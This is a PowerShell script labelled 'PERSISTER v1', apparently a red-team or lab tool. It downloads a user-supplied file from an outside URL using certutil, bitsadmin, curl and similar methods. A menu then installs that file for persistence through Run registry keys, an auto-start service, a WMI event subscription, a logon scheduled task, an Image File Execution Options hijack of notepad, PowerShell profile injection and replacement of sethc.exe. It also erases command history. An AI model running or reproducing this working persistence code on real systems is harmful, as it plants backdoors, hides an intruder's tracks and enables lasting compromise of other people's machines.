$text= @"
                       _oo0oo_"
                      o8888888o"
                      88`" . `"88"
                      (| -_- |)"
                      0\  =  /0"
                    ___/`----'\___"
                  .' \\|     |// '."
                 / \\|||  :  |||// \"
                / _||||| -:- |||||- \"
               |   | \\\  -  /// |   |"
               | \_|  ''\---/''  |_/ |"
               \  .-\__  '-'  ___/-. /"
             ___'. .'  /--.--\  `. .'___"
         .`"`" '<  `.___\_<|>_/___.' >' `"`"."
         | | :   `- \`.;`\ _ /`;.`/ -   ` : | |"
         \  \ `_.   \_ __\ /__ _/   .-` /  /"
     =====`-.____`.___ \_____/___.-`___.-'====="
                       `=---='"
               | P E R S I S T E R v1 |
			   
			   
"@

Write-Host $text -ForegroundColor 'White' 

function Show-Menu {
    param (
        [string]$Title = 'Please choose an action:'
    )
    Write-Host "================ $Persistence options ================"
    
    Write-Host "1: Registry Key modification"
	Write-Host "2: Service creation"
	Write-Host "3: Remove command history"
	Write-Host "4: WMI Event subscription creation"
	Write-Host "5: Scheduled Task creation"
	Write-Host "6: Image file option modification"
	Write-Host "7: PowerShell profile generation"
	Write-Host "8: Sethc Hijacking"
    Write-Host "9: Quit"
}
# Try downloading the file using different methods
$downloaded = $false

# Ensure all URLs are appended with http at the start instead of https
# Sub out the exe with a zip file 

# Prompt user for a full file path
$destFilePath = Read-Host "Please enter the destination file path"

# Prompt user for a URL
$urlChoice = Read-Host "Please enter the URL"

$urls = @(
    "wget $urlChoice",
    "certutil -urlcache -split -f $urlChoice $destFilePath",
    "curl -o $destFilePath $urlChoice",
    "Invoke-WebRequest -Uri '$urlChoice' -OutFile '$destFilePath'",
    "bitsadmin /transfer 'JobName' /download /priority normal '$urlChoice' '$destFilePath'",
    "Invoke-WebRequest -Uri '$urlChoice' -OutFile '$destFilePath'"
)


foreach ($url in $urls) {
    try {
		echo "Attempting to download file"
        Invoke-Expression $url
        $downloaded = $true
        break
    } catch {
        continue
    }
}

if ($downloaded -and (Test-Path "$destFilePath") -and $PSVersionTable.PSVersion.Major -ge 5) {
	echo "Powershell v5+ detected - Moving forward with decompression"
    # Remove comments and specify path + outfile path for extraction of content.
    # Extract the ZIP file - Make sure that this has been zip via "right click folder > Send to > Compressed(Zipped) folder" - Must be powershell v5 also
   #Expand-Archive -Path "C:\Users\vagrant\MyAppV9.zip" -DestinationPath "C:\Users\vagrant\Documents\MyAppV9"
    # Remove the ZIP file
   #Remove-Item -Path "C:\Users\vagrant\MyAppV9.zip" -Force
   
   do {
    Show-Menu
    $input = Read-Host "Please select an option (1-9)"
    switch ($input) {
        '1' {
            Write-Host "Attempting registry modifications" -ForegroundColor 'Yellow'
            try {
                Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyAppV9" -Value "$destFilePath"
                Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyAppV9" -Value "$destFilePath"
                Write-Host "Registry modifications successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to modify registry. Attempting command line registry addition..." -ForegroundColor 'Yellow'
                reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyAppV9" /d "$destFilePath" /f
                reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyAppV9" /d "$destFilePath" /f
            }
        }
        '2' {
            Write-Host "Attempting service creation" -ForegroundColor 'Yellow'
            try {
                $serviceCommand = "cmd.exe /C '$destFilePath'"
                $serviceName = "MyAppV9lication"
                $startType = "auto"
                New-Service -Name $serviceName -BinaryPathName $serviceCommand -StartupType Automatic
                Write-Host "Service creation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to create service." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '3' {
            Write-Host "Attempting command history removal" -ForegroundColor 'Yellow'
            try {
                Remove-Item (Get-PSReadlineOption).HistorySavePath
                Write-Host "Command history removal successful."
            } catch {
                Write-Host "Could not execute - Manual attempt required." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '4' {
            Write-Host "Attempting WMI Event subscription creation" -ForegroundColor 'Yellow'
            try {
                $EventFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); 
                $EventFilter.QueryLanguage = "WQL"; 
                $EventFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'"; 
                $EventFilter.Name = "MyEventFilter"; 
                $EventFilter.EventNamespace = 'root\cimv2'; 
                $EventFilter.Put(); 
                $EventConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); 
                $EventConsumer.Name = "MyEventConsumer"; 
                $EventConsumer.CommandLineTemplate = "$destFilePath"; 
                $EventConsumer.Put(); 
                $FilterToConsumerBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance(); 
                $FilterToConsumerBinding.Filter = $EventFilter.__PATH; 
                $FilterToConsumerBinding.Consumer = $EventConsumer.__PATH; 
                $FilterToConsumerBinding.Put()
                Write-Host "WMI Event subscription creation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Error, could not complete WMI Event subscription creation." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '5' {
            Write-Host "Attempting scheduled task creation" -ForegroundColor 'Yellow'
            try {
                schtasks /create /tn "MyAppTask" /tr "$destFilePath" /sc onlogon
                Write-Host "Scheduled task creation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Could not create the scheduled task." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '6' {
            Write-Host "Attempting image file option modification"
            try {
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -Value "$destFilePath"
                Write-Host "Image file execution option modification successful."
            } catch {
                Write-Host "Error occurred - No permissions or this registry value does not exist." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '7' {
            Write-Host "Attempting PowerShell profile generation" -ForegroundColor 'Yellow'
            try {
                $profilePath = [System.Environment]::GetFolderPath('MyDocuments') + '\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'; 
                Add-Content -Path $profilePath -Value 'Start-Process $destFilePath'
                Write-Host "PowerShell profile generation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to generate PowerShell profile." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '8' {
            Write-Host "Attempting Sethc hijacking" -ForegroundColor 'Yellow'
            try {
                Copy-Item -Path "$destFilePath" -Destination "C:\Windows\System32\sethc.exe" -Force
                Write-Host "Sethc hijacking successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to hijack Sethc." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '9' {
            Write-Host 'Exiting...' -ForegroundColor 'Yellow'
            break
        }
        default {
            Write-Host 'Invalid option, please choose a valid option.' -ForegroundColor 'Red' -BackgroundColor 'Black'
        }
    }
} while ($input -ne '9')
}
else{ 
    echo "PowerShell version was too new, reverting to older decompression method"
   # Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\Users\vagrant\oldCompress.zip','C:\Users\vagrant\newUncompressed')
    #Remove the ZIP file
    #Remove-Item -Path "C:\Users\vagrant\oldCompress.zip" -Force
 
    do {
    Show-Menu
    $input = Read-Host "Please select an option (1-9)"
    switch ($input) {
        '1' {
            Write-Host "Attempting registry modifications" -ForegroundColor 'Yellow'
            try {
                Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyAppV9" -Value "$destFilePath"
                Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyAppV9" -Value "$destFilePath"
                Write-Host "Registry modifications successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to modify registry. Attempting command line registry addition..." -ForegroundColor 'Yellow'
                reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyAppV9" /d "$destFilePath" /f
                reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyAppV9" /d "$destFilePath" /f
            }
        }
        '2' {
            Write-Host "Attempting service creation" -ForegroundColor 'Yellow'
            try {
                $serviceCommand = "cmd.exe /C '$destFilePath'"
                $serviceName = "MyAppV9lication"
                $startType = "auto"
                New-Service -Name $serviceName -BinaryPathName $serviceCommand -StartupType Automatic
                Write-Host "Service creation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to create service." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '3' {
            Write-Host "Attempting command history removal" -ForegroundColor 'Yellow'
            try {
                Remove-Item (Get-PSReadlineOption).HistorySavePath
                Write-Host "Command history removal successful."
            } catch {
                Write-Host "Could not execute - Manual attempt required." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '4' {
            Write-Host "Attempting WMI Event subscription creation" -ForegroundColor 'Yellow'
            try {
                $EventFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); 
                $EventFilter.QueryLanguage = "WQL"; 
                $EventFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'"; 
                $EventFilter.Name = "MyEventFilter"; 
                $EventFilter.EventNamespace = 'root\cimv2'; 
                $EventFilter.Put(); 
                $EventConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); 
                $EventConsumer.Name = "MyEventConsumer"; 
                $EventConsumer.CommandLineTemplate = "$destFilePath"; 
                $EventConsumer.Put(); 
                $FilterToConsumerBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance(); 
                $FilterToConsumerBinding.Filter = $EventFilter.__PATH; 
                $FilterToConsumerBinding.Consumer = $EventConsumer.__PATH; 
                $FilterToConsumerBinding.Put()
                Write-Host "WMI Event subscription creation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Error, could not complete WMI Event subscription creation." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '5' {
            Write-Host "Attempting scheduled task creation" -ForegroundColor 'Yellow'
            try {
                schtasks /create /tn "MyAppTask" /tr "$destFilePath" /sc onlogon
                Write-Host "Scheduled task creation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Could not create the scheduled task." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '6' {
            Write-Host "Attempting image file option modification"
            try {
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -Value "$destFilePath"
                Write-Host "Image file execution option modification successful."
            } catch {
                Write-Host "Error occurred - No permissions or this registry value does not exist." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '7' {
            Write-Host "Attempting PowerShell profile generation" -ForegroundColor 'Yellow'
            try {
                $profilePath = [System.Environment]::GetFolderPath('MyDocuments') + '\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'; 
                Add-Content -Path $profilePath -Value 'Start-Process $destFilePath'
                Write-Host "PowerShell profile generation successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to generate PowerShell profile." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '8' {
            Write-Host "Attempting Sethc hijacking" -ForegroundColor 'Yellow'
            try {
                Copy-Item -Path "$destFilePath" -Destination "C:\Windows\System32\sethc.exe" -Force
                Write-Host "Sethc hijacking successful." -ForegroundColor 'Yellow'
            } catch {
                Write-Host "Failed to hijack Sethc." -ForegroundColor 'Red' -BackgroundColor 'Black'
            }
        }
        '9' {
            Write-Host 'Exiting...' -ForegroundColor 'Yellow'
            break
        }
        default {
            Write-Host 'Invalid option, please choose a valid option.' -ForegroundColor 'Red' -BackgroundColor 'Black'
        }
    }
} while ($input -ne '9')
}
} while ($input -ne '9')
